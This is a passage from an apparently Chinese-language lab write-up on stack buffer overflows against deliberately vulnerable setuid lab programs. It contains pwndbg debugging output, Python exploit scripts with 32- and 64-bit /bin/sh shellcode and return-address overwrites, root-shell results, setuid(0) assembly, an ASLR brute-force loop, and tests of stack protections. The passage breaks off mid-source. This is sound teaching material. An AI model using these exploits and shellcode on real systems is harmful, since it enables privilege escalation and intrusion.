</span><br><span class="line">   25 int main(int argc, char **argv)</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffc820 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span><br><span class="line">01:0004│     0xffffc824 —▸ 0x56557031 ◂— 0x3d3d3d00</span><br><span class="line">02:0008│     0xffffc828 —▸ 0xffffccb4 ◂— 0x0</span><br><span class="line">03:000c│     0xffffc82c ◂— 0x0</span><br><span class="line">... ↓        4 skipped</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0 0x5655621e bof+17</span><br><span class="line">   1 0x56556342 dummy_function+58</span><br><span class="line">   2 0x565562da main+158</span><br><span class="line">   3 0xf7c21519 __libc_start_call_main+121</span><br><span class="line">   4 0xf7c215f3 __libc_start_main+147</span><br><span class="line">   5 0x5655610b _start+43</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p <span class="variable">$ebp</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *) 0xffffc898</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;buffer</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = (char (*)[100]) 0xffffc82c</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x 0xffffc898 - 0xffffc82c</span></span><br><span class="line">0x6c:	Cannot access memory at address 0x6c</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">q</span></span><br></pre></td></tr></table></figure>

<p><strong>构造python脚本</strong>：根据动态调试结果构造python脚本如下，python脚本对content（即payload）变量进行三次赋值，第一次赋值为长度为517字节全<code>\x90</code>，第二次将content末尾修改为shellcode，最后将rbp寄存器指向地址修改为程序原本返回的地址（防止程序在执行shellcode前因无法执行返回操作而崩溃）。注意gdb调试获取到的栈指针地址与实际运行会略有不同，因为gdb会将一些环境数据压入栈中，导致实际的栈指针变量会偏大，因此在构造payload时，ret的值并不是ebp，而是应该增大一些（&gt;&#x3D;96）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffcd98</span> + <span class="number">96</span>           <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">112</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">4</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p><strong>执行漏洞程序，获取到root权限shell</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit.py                                    </span><br><span class="line">❯ ./stack-L1</span><br><span class="line">Input size: 517</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span>                                                                       </span><br><span class="line">root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span> </span><br></pre></td></tr></table></figure>

<h3 id="Task4：对未知buffer大小的程序进行攻击"><a href="#Task4：对未知buffer大小的程序进行攻击" class="headerlink" title="Task4：对未知buffer大小的程序进行攻击"></a>Task4：对未知buffer大小的程序进行攻击</h3><p>由于buffer大小未知，可以考虑喷射方法，将payload前若干项全部修改为要返回的地址，由于给定限定条件buffer大小位于100到200，所以可以考虑在前200+4项全部覆盖为ret_addr。这样总会将ebp地址覆盖为要返回的地址。</p>
<p>选择攻击stack-L2，首先进行gdb调试，获取ebp地址：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b bof</span></span><br><span class="line">Breakpoint 1 at 0x1221: file stack.c, line 20.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span></span><br><span class="line">Starting program: /home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L2-dbg </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">Input size: 517</span><br><span class="line"></span><br><span class="line">Breakpoint 1, bof (str=0xffffccc3 &#x27;\220&#x27; &lt;repeats 112 times&gt;, &quot;\020\316\377\377&quot;, &#x27;\220&#x27; &lt;repeats 84 times&gt;...) at stack.c:20</span><br><span class="line">20	    strcpy(buffer, str);       </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line">*EAX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*EBX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*ECX  0x60</span><br><span class="line">*EDX  0xffffcca0 —▸ 0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L2-dbg&#x27;</span><br><span class="line">*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0</span><br><span class="line">*ESI  0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L2-dbg&#x27;</span><br><span class="line">*EBP  0xffffc898 —▸ 0xffffcca8 —▸ 0xffffced8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— ...</span><br><span class="line">*ESP  0xffffc7f0 ◂— 0x205</span><br><span class="line">*EIP  0x56556221 (bof+20) ◂— 0xff08ec83</span><br><span class="line">───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────</span><br><span class="line"> ► 0x56556221 &lt;bof+20&gt;    sub    esp, 8</span><br><span class="line">   0x56556224 &lt;bof+23&gt;    push   dword ptr [ebp + 8]</span><br><span class="line">   0x56556227 &lt;bof+26&gt;    lea    edx, [ebp - 0xa8]</span><br><span class="line">   0x5655622d &lt;bof+32&gt;    push   edx</span><br><span class="line">   0x5655622e &lt;bof+33&gt;    mov    ebx, eax</span><br><span class="line">   0x56556230 &lt;bof+35&gt;    call   strcpy@plt                    &lt;strcpy@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x56556235 &lt;bof+40&gt;    add    esp, 0x10</span><br><span class="line">   0x56556238 &lt;bof+43&gt;    mov    eax, 1</span><br><span class="line">   0x5655623d &lt;bof+48&gt;    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">   0x56556240 &lt;bof+51&gt;    leave  </span><br><span class="line">   0x56556241 &lt;bof+52&gt;    ret    </span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack.c</span><br><span class="line">   15 int bof(char *str)</span><br><span class="line">   16 &#123;</span><br><span class="line">   17     char buffer[BUF_SIZE];</span><br><span class="line">   18 </span><br><span class="line">   19     // The following statement has a buffer overflow problem </span><br><span class="line"> ► 20     strcpy(buffer, str);       </span><br><span class="line">   21 </span><br><span class="line">   22     return 1;</span><br><span class="line">   23 &#125;</span><br><span class="line">   24 </span><br><span class="line">   25 int main(int argc, char **argv)</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffc7f0 ◂— 0x205</span><br><span class="line">01:0004│     0xffffc7f4 ◂— 0x0</span><br><span class="line">02:0008│     0xffffc7f8 —▸ 0xffffc884 ◂— 0x0</span><br><span class="line">03:000c│     0xffffc7fc ◂— 0x0</span><br><span class="line">04:0010│     0xffffc800 —▸ 0xf7db68a0 (step0_jumps) ◂— 0x0</span><br><span class="line">05:0014│     0xffffc804 ◂— 0xffffffff</span><br><span class="line">06:0018│     0xffffc808 —▸ 0xf7c1aac9 ◂— &#x27;ld-linux.so.2&#x27;</span><br><span class="line">07:001c│     0xffffc80c —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0 0x56556221 bof+20</span><br><span class="line">   1 0x56556348 dummy_function+58</span><br><span class="line">   2 0x565562e0 main+158</span><br><span class="line">   3 0xf7c21519 __libc_start_call_main+121</span><br><span class="line">   4 0xf7c215f3 __libc_start_main+147</span><br><span class="line">   5 0x5655610b _start+43</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p <span class="variable">$ebp</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *) 0xffffc898</span></span><br></pre></td></tr></table></figure>

<p>利用此信息进行喷射攻击。构造python脚本如下</p>
<p><code>exploit.py</code>：将payload前208项全部覆盖为ret地址，ret地址需要大于等于$ebp+232。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffc898</span> + <span class="number">232</span>        <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">207</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">4</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[<span class="number">0</span>:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)*<span class="number">52</span> </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果获取到root权限的shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L2.py</span><br><span class="line">❯ ./stack-L2</span><br><span class="line">Input size: <span class="number">514</span></span><br><span class="line"><span class="comment"># whoami                                                                       </span></span><br><span class="line">root</span><br><span class="line"><span class="comment">#  </span></span><br></pre></td></tr></table></figure>

<h3 id="Task5：针对64位程序的攻击"><a href="#Task5：针对64位程序的攻击" class="headerlink" title="Task5：针对64位程序的攻击"></a>Task5：针对64位程序的攻击</h3><p>64位程序与32位程序类似，但是由于地址前4位均为0，如果直接输入会导致strcpy函数遇<code>\x00</code>截断，导致shellcode无法进栈，因此可以考虑通过将shellcode放在ret前。python脚本构造如下：</p>
<p><code>python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">40</span>            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffd5b0</span>+<span class="number">220</span>      <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">208</span>+<span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">8</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="comment"># content[0:offset+L] = (ret).to_bytes(L,byteorder=&#x27;little&#x27;)*29</span></span><br><span class="line">content[offset:offset+L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>((ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功获得root权限shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L3.py</span><br><span class="line">b&#x27;\x8c\xd6\xff\xff\xff\x7f\x00\x00&#x27;</span><br><span class="line">❯ ./stack-L3</span><br><span class="line">Input size: 517</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span>                                                                       </span><br><span class="line">root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span>                                                                         </span><br></pre></td></tr></table></figure>

<h3 id="Task6：攻击64位程序（buffer很小）"><a href="#Task6：攻击64位程序（buffer很小）" class="headerlink" title="Task6：攻击64位程序（buffer很小）"></a>Task6：攻击64位程序（buffer很小）</h3><p>由于buffer size变小，不足以插入shellcode，可以考虑利用在main函数中参数中出现的shellcode。gdb调试如下，记录shellcode的所在地址，令<code>ret=0x7fffffffdca0 + 220</code>，即可成功跳转到shellcode</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">stack 70</span></span><br><span class="line">00:0000│ rsp 0x7fffffffdab0 —▸ 0x7fffffffddf8 —▸ 0x7fffffffe18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L4-dbg&#x27;</span><br><span class="line">01:0008│     0x7fffffffdab8 ◂— 0x100000000</span><br><span class="line">02:0010│     0x7fffffffdac0 ◂— 0x9090909090909090</span><br><span class="line">03:0018│     0x7fffffffdac8 ◂— 0x9090909090909090</span><br><span class="line">04:0020│     0x7fffffffdad0 ◂— 0x7fffffffd6909090</span><br><span class="line">05:0028│     0x7fffffffdad8 ◂— 0x9090909090900000</span><br><span class="line">06:0030│     0x7fffffffdae0 ◂— 0x9090909090909090</span><br><span class="line">... ↓        55 skipped</span><br><span class="line">3e:01f0│     0x7fffffffdca0 ◂— 0x622fb84852d23148</span><br><span class="line">3f:01f8│     0x7fffffffdca8 ◂— 0x485068732f2f6e69 (&#x27;in//shPH&#x27;)</span><br><span class="line">40:0200│     0x7fffffffdcb0 ◂— 0x48e689485752e789</span><br><span class="line">41:0208│     0x7fffffffdcb8 ◂— 0x9090050f3bb0c031</span><br><span class="line">42:0210│     0x7fffffffdcc0 ◂— 0x7f9090909090</span><br><span class="line">43:0218│     0x7fffffffdcc8 ◂— 0x64 /* &#x27;d&#x27; */</span><br><span class="line">44:0220│     0x7fffffffdcd0 ◂— 0x20500001000</span><br><span class="line">45:0228│     0x7fffffffdcd8 —▸ 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>python脚本如下</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="number">7</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffdca0</span> + <span class="number">220</span>      <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">10</span>+<span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">8</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="comment"># content[0:offset+L] = (ret).to_bytes(L,byteorder=&#x27;little&#x27;)*29</span></span><br><span class="line">content[offset:offset+L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功获取root权限下的shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L4.py</span><br><span class="line">❯ ./stack-L4</span><br><span class="line">Input size: 517</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span>                                                                       </span><br><span class="line">root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span>    </span><br></pre></td></tr></table></figure>

<h3 id="Task-7：Defeating-dash’s-Countermeasure"><a href="#Task-7：Defeating-dash’s-Countermeasure" class="headerlink" title="Task 7：Defeating dash’s Countermeasure"></a>Task 7：Defeating dash’s Countermeasure</h3><p>输入命令改回设置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo ln -sf /bin/dash /bin/sh</span><br></pre></td></tr></table></figure>

<p>修改call_shellcode.c，将setuid的汇编代码加入到shellcode中，重新编译并运行，可以发现shell具有root权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ make setuid</span><br><span class="line">gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">gcc -z execstack -o a64.out call_shellcode.c</span><br><span class="line">sudo chown root a32.out a64.out</span><br><span class="line">[sudo] bronya 的密码： </span><br><span class="line">sudo chmod 4755 a32.out a64.out</span><br><span class="line">❯ ./a32.out</span><br><span class="line">sh-5.1# whoami</span><br><span class="line">root</span><br><span class="line">sh-5.1# exit</span><br><span class="line">exit</span><br><span class="line">❯ ./a64.out</span><br><span class="line">sh-5.1# whoami</span><br><span class="line">root</span><br><span class="line">sh-5.1# exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>setuid（0）汇编语言如下，可见主要操作为将real uid设置为0，即root用户的uid，这样当bash执行文件时会发现real id与拥有者id一致，因此不会限制权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; Invoke setuid(0): 32-bit</span><br><span class="line">xor ebx, ebx ; ebx = 0: setuid()’s argument</span><br><span class="line">xor eax, eax</span><br><span class="line">mov al, 0xd5 ; setuid()’s system call number</span><br><span class="line">int 0x80</span><br><span class="line">; Invoke setuid(0): 64-bit</span><br><span class="line">xor rdi, rdi ; rdi = 0: setuid()’s argument</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 0x69 ; setuid()’s system call number</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<h3 id="Task-8-Defeating-Address-Randomization"><a href="#Task-8-Defeating-Address-Randomization" class="headerlink" title="Task 8: Defeating Address Randomization"></a>Task 8: Defeating Address Randomization</h3><p>在32位机器上，由于栈比较小，可以通过暴力破解的方式来攻破ASLR地址随机化。</p>
<p>运行命令重新开启ASLR机制：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo /sbin/sysctl -w kernel.randomize_va_space=2</span><br><span class="line">kernel.randomize_va_space = 2</span><br></pre></td></tr></table></figure>

<p>尝试攻击stack-L1，可以发现报错，由于ASLR随机了栈基址，导致ret的值失效。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L1.py</span><br><span class="line">❯ ./stack-L1</span><br><span class="line">Input size: 517</span><br><span class="line">[1]    12494 segmentation fault (core dumped)  ./stack-L1</span><br></pre></td></tr></table></figure>

<p>使用暴力破解的方式来尝试攻击，运行脚本，由于随机性较强，没有解出：</p>
<img src="/posts/637eab0b/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-setuid.png" class="" title="暴力破解">

<p>暴力破解脚本如下，主要执行了循环进行攻击的操作。</p>
<p><code>brute_force.sh</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line"></span><br><span class="line">while true; do</span><br><span class="line">  value=$(( $value + 1 ))</span><br><span class="line">  duration=$SECONDS</span><br><span class="line">  min=$(($duration / 60))</span><br><span class="line">  sec=$(($duration % 60))</span><br><span class="line">  echo &quot;$min minutes and $sec seconds elapsed.&quot;</span><br><span class="line">  echo &quot;The program has been running $value times so far.&quot;</span><br><span class="line">  ./stack-L1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h3 id="Task-9：Experimenting-with-Other-Countermeasures"><a href="#Task-9：Experimenting-with-Other-Countermeasures" class="headerlink" title="Task 9：Experimenting with Other Countermeasures"></a>Task 9：Experimenting with Other Countermeasures</h3><ol>
<li><p><strong>Task 9.a: Turn on the StackGuard Protection</strong>  </p>
<p>开启StackGuard防护。使用gcc命令重新编译stack-L1，尝试进行攻击</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ./stack</span><br><span class="line">Input size: 517</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">[1]    19472 IOT instruction (core dumped)  ./stack</span><br></pre></td></tr></table></figure>

<p>可以发现，stack smashing detected，表明检测到栈溢出，自动停止程序运行。</p>
</li>
<li><p><strong>Task 9.b: Turn on the Non-executable Stack Protection</strong>  </p>
<p>开启DEP防护，重新编译a32out，a64out，查看结果，发现无法弹出shell，说明数据段中代码不可执行，无法成功攻击。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ gcc -DBUF_SIZE=100 -m32 -o a32.out -fno-stack-protector call_shellcode.c</span><br><span class="line"></span><br><span class="line">❯ gcc -DBUF_SIZE=100 -m64 -o a64.out -fno-stack-protector call_shellcode.c</span><br><span class="line"></span><br><span class="line">❯ sudo chmod 4755 a32.out</span><br><span class="line">[sudo] bronya 的密码： </span><br><span class="line">❯ sudo chmod 4755 a64.out</span><br><span class="line">❯ sudo chown root a32.out</span><br><span class="line">❯ sudo chown root a64.out</span><br><span class="line">❯ ./a64.out</span><br><span class="line">[1]    25967 segmentation fault (core dumped)  ./a64.out</span><br><span class="line">❯ ./a32.out</span><br><span class="line">[1]    26060 segmentation fault (core dumped)  ./a32.out</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="stack-overflow-Server"><a href="#stack-overflow-Server" class="headerlink" title="stack-overflow(Server)"></a>stack-overflow(Server)</h2><h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><p>关闭ASLR</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>

<p>漏洞程序分析，程序中bof函数存在漏洞，原理同stack-overflow(setuid)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack.</span></span><br><span class="line"><span class="comment">* Instructors can change this value each year, so students</span></span><br><span class="line"><span class="comment">* won’t be able to use the solutions from the past. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"><span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, str); P</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line"><span class="type">int</span> length = fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, <span class="built_in">stdin</span>);</span><br><span class="line">bof(str);</span><br><span class="line"><span 